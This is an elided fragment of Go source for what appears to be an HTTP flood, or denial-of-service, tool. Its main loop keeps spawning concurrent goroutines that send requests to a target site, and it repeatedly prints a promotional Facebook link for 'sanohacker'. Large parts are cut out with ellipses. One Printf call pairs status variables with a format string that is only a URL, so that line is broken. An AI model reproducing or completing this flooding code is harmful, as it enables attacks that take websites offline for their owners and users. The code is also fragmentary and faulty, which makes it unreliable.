...
func main() {
	...
	if err != nil {
		fmt.Println("https://www.facebook.com/sanohacker")
		os.Exit(1)
	}
	...
	go func() {
		...
		fmt.Println("Add FB: https://www.facebook.com/sanohacker")
		for {
			if atomic.LoadInt32(&cur) < int32(maxproc-1) {
				go httpcall(site, u.Host, data, headers, ss)
			}
			if sent%10 == 0 {
				fmt.Printf("https://www.facebook.com/sanohacker", cur, maxproc, sent, err)
			}
			switch <-ss {
			case callExitOnErr:
